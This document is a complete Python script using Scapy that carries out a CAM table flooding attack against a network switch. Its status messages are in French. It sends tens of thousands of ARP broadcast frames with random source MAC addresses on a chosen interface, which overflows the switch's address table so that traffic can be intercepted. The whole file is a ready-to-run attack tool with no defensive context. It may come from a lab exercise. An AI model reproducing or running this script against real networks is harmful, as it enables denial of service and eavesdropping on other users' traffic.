#!/usr/bin/env python3
from scapy.all import *
import random

def generate_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])

def cam_flooding(interface="ens224", count=50000):
    print(f"[*] CAM Flooding sur {interface}")
    print(f"[*] Envoi de {count} paquets avec MACs aleatoires...")
    
    packets = []
    for _ in range(count):
        mac = generate_mac()
        pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, psrc="0.0.0.0", hwsrc=mac)
        packets.append(pkt)
    
    sendp(packets, iface=interface, verbose=False)
    print("[*] Attaque terminee")

if __name__ == "__main__":
    import sys
    interface = sys.argv[1] if len(sys.argv) > 1 else "ens224"
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 50000
    cam_flooding(interface, count)
